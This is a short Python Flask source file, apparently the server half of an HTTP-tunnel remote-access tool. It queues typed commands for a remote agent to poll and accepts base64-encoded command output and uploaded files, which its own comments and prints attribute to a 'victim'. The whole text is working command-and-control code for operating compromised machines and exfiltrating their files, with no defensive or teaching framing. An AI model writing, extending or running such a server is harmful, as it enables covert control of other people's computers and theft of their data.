http tunnel redone > serverhttp_real.py > ...
from flask import Flask, request
import threading
import sys
import select
import base64
import os

app = Flask(__name__)
command_queue = []
cmd_lock = threading.Lock()

def print_prompt():
    sys.stdout.write("\nCMD> ")
    sys.stdout.flush()

@app.route('/poll')
def get_command():
    with cmd_lock:
        if command_queue:
            return command_queue.pop(0)
        return "wait"

@app.route('/submit', methods=['POST'])
def post_output():
    output = base64.b64decode(request.data).decode('utf-8', errors='replace')

    if output.startswith("FILE:"): # Received file from victim
        filename = output.split("FILENAME:")[1].split()[0] if "FILENAME:" in output else "received_file"
        file_data = base64.b64decode(output[5:].split("FILENAME:")[0])
        with open(filename, "wb") as f:
            f.write(file_data)
        print(f"\n[+] File saved as '{filename}'")
    else:
        print(f"\n[Victim]\n{output}")

    print_prompt()
    return "ACK"
